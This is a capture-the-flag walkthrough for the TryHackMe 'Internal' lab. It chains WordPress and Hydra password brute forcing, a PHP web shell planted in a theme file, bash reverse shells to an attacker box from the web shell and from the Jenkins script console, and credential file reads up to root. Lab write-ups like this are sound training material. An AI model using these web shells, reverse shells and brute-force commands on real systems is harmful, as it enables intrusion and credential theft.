# Internal

Penetration Testing Challenge

Room: https://tryhackme.com/room/internal

⚠️ STOP

Stuck and need a nudge in the right direction?

➡️ Try the hints page before reading the full solution: https://github.com/garthheff/CTF-Hints/blob/main/internal.md

## Scope and setup

The room notes that the target hostname should be mapped locally and that:

```text
Any tools or techniques are permitted in this engagement
```

Add the hostname to `/etc/hosts`:

```bash
echo "10.64.162.84 internal.thm" | sudo tee -a /etc/hosts
```

Confirm it resolves:

```bash
ping -c 1 internal.thm
```

---

## Enumeration

Start with a full TCP port scan:

```bash
sudo nmap -sV -sC -p- --min-rate 5000 -oN nmap-sv-all.txt 10.64.162.84
```

Results:

```text
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3
80/tcp open  http    Apache httpd 2.4.29
```

Only SSH and HTTP were exposed. Port 80 initially showed the Apache default page, so the next step was web enumeration using both the IP address and the hostname.

WordPress was discovered under:

```text
http://internal.thm/wordpress/
```

---

## WordPress enumeration

Run WPScan against the discovered WordPress path:

```bash
wpscan --url http://internal.thm/wordpress
```

WPScan confirmed:

```text
WordPress version: 5.4.2
XML-RPC enabled
WordPress readme found
Theme: twentyseventeen
No plugins found
No config backups found
```

The important point was that WordPress was outdated, but most of the listed vulnerabilities were authenticated or role-based. That made username and password discovery the next logical step. The uploaded WPScan output confirms WordPress 5.4.2, XML-RPC, the Twenty Seventeen theme, no plugins, and no config backups. 

Enumerate WordPress users:

```bash
wpscan --url http://internal.thm/wordpress -e u
```

Create a user list from the result:

```bash
cat > users.txt <<'EOF'
admin
EOF
```

Run a password attack against WordPress:

```bash
wpscan --url http://internal.thm/wordpress \
  -U users.txt \
  -P /usr/share/wordlists/rockyou.txt \
  -o wpscan-bruteforce.txt
```

Valid WordPress credentials were found:

```text
admin : my****
```

---

## WordPress admin to command execution

Log in to WordPress:

```text
http://internal.thm/wordpress/wp-login.php
```

Use the discovered admin credentials.

From the dashboard, go to:

```text
Appearance → Theme Editor
```

Or directly:

```text
http://internal.thm/wordpress/wp-admin/theme-editor.php
```

Edit a PHP theme file, such as `404.php`, and add a simple command execution test:

```php
<?php system($_GET['cmd']); ?>
```

Trigger it from the browser:

```text
http://internal.thm/wordpress/wp-content/themes/twentyseventeen/404.php?cmd=id
```

Command execution was confirmed as the web server user:

```text
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

Set up a listener:

```bash
nc -lvnp 4444
```

Trigger a reverse shell through the modified PHP file:

```text
http://internal.thm/wordpress/wp-content/themes/twentyseventeen/404.php?cmd=bash%20-c%20%27bash%20-i%20%3E%26%20/dev/tcp/YOUR_ATTACKBOX_IP/4444%200%3E%261%27
```

Stabilize the shell:

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm
```

Background with `Ctrl+Z`, then run:

```bash
stty raw -echo; fg
```

---

## WordPress config credentials

After getting a shell as `www-data`, check the WordPress config file:

```bash
cat /var/www/html/wordpress/wp-config.php
```

Or pull out only the database settings:

```bash
grep -E "DB_NAME|DB_USER|DB_PASSWORD|DB_HOST" /var/www/html/wordpress/wp-config.php
```

The config contained database credentials:

```text
DB_USER: wordpress
DB_PASSWORD: word********
DB_HOST: localhost
```

Connect to MySQL:

```bash
mysql -u wordpress -p
```

Enumerate the database:

```sql
show databases;
use wordpress;
show tables;
select * from wp_users;
```

The WordPress database contained the `admin` user, but it did not reveal the next privilege escalation path.

---

## Local file review

While enumerating the filesystem as `www-data`, check useful locations such as `/opt`:

```bash
ls -la /opt
cat /opt/wp-save.txt
```

The file contained a note and credentials for the local user `aubreanna`:

```text
aubreanna : bubb*********!@#***
```

This gave a valid password for the local account.

---

## From www-data to aubreanna

Use the credentials from `/opt/wp-save.txt` to switch user:

```bash
su - aubreanna
```

After logging in as `aubreanna`, check the home directory:

```bash
cd ~
ls -la
```

Read the user flag:

```bash
cat user.txt
```

User flag:

```text
THM{int3***********_1}
```

A Jenkins clue was also present:

```bash
cat jenkins.txt
```

Output:

```text
Internal Jenkins service is running on 172.17.0.2:8080
```

The uploaded terminal output also shows the local file review, including `/opt/wp-save.txt`, `jenkins.txt`, and the Jenkins process/Docker checks. 

---

## Jenkins discovery

As `aubreanna`, process enumeration showed Jenkins running inside a Docker container:

```bash
ps aux | grep -i jenkins
ps aux | grep -i docker
ss -tulpn | grep 8080
```

Useful findings:

```text
java -Duser.home=/var/jenkins_home ... jenkins.war
docker-proxy ... 127.0.0.1:8080 -> 172.17.0.2:8080
```

Although `jenkins.txt` mentioned `172.17.0.2:8080`, Docker was already forwarding the Jenkins container to localhost on the host. The uploaded process output confirms Jenkins was listening on `127.0.0.1:8080` and being proxied to the container. 

Create an SSH tunnel from the AttackBox:

```bash
ssh -L 8080:127.0.0.1:8080 aubreanna@10.64.162.84
```

Leave that SSH session open.

Open Jenkins locally:

```text
http://127.0.0.1:8080
```

---

## Jenkins brute force

The known reused credentials did not work for Jenkins, so brute force the Jenkins login form.

Create a small username list:

```bash
cat > jenkins-users.txt <<'EOF'
admin
jenkins
aubreanna
bill
root
EOF
```

Run Hydra through the SSH tunnel:

```bash
hydra -L jenkins-users.txt -P /usr/share/wordlists/rockyou.txt \
  127.0.0.1 -s 8080 \
  http-post-form "/j_acegi_security_check:j_username=^USER^&j_password=^PASS^&from=%2F&Submit=Sign+in:F=Invalid"
```

Hydra found valid Jenkins credentials:

```text
admin : spo******
```

Log in to Jenkins:

```text
http://127.0.0.1:8080
```

---

## Jenkins Script Console RCE

After logging in as Jenkins admin, go to the Script Console:

```text
http://127.0.0.1:8080/script
```

Test command execution:

```groovy
def cmd = "whoami && id && hostname"
def proc = ["bash","-c",cmd].execute()
println proc.text
```

Output confirmed code execution as the Jenkins user inside the container:

```text
jenkins
uid=1000(jenkins) gid=1000(jenkins) groups=1000(jenkins)
jenkins
```

Catch a reverse shell from Jenkins.

On the AttackBox:

```bash
nc -lvnp 5555
```

In Jenkins Script Console:

```groovy
def cmd = "bash -c 'bash -i >& /dev/tcp/YOUR_ATTACKBOX_IP/5555 0>&1'"
def proc = ["bash","-c",cmd].execute()
println proc.text
```

The shell landed inside the Jenkins container:

```text
jenkins@jenkins:/$ id
uid=1000(jenkins) gid=1000(jenkins) groups=1000(jenkins)
```

---

## Jenkins container credential discovery

Inside the Jenkins container, enumerate useful locations:

```bash
ls -la /
ls -la /opt
find / -type f -readable 2>/dev/null | grep -iE 'note|pass|cred|root|ssh|key|txt'
```

A note was found in `/opt`:

```bash
cat /opt/note.txt
```

It contained root credentials:

```text
root : tr0ub*********!@#***
```

The note explained that the credentials were intentionally stored behind the Jenkins container as another layer of defense.

---

## Root

Return to the host shell as `aubreanna`, then switch to root:

```bash
su root
```

Use the root password from the Jenkins container note.

Read the root flag:

```bash
cd /root
cat root.txt
```

Root flag:

```text
THM{d0ck***********}
```

---

## Attack chain summary

```text
1. Add internal.thm to /etc/hosts
2. Nmap finds SSH and HTTP
3. WordPress found under /wordpress
4. WPScan enumerates WordPress and user admin
5. WPScan brute force finds WordPress admin credentials
6. WordPress theme editor gives RCE as www-data
7. wp-config.php reveals database credentials
8. /opt/wp-save.txt reveals aubreanna credentials
9. su to aubreanna
10. user flag and jenkins.txt found in aubreanna home
11. Jenkins discovered on localhost through Docker proxy
12. SSH tunnel exposes Jenkins locally on AttackBox
13. Hydra finds Jenkins admin credentials
14. Jenkins Script Console gives shell inside container
15. /opt/note.txt inside container reveals root credentials
16. su root on host
17. root flag captured
```
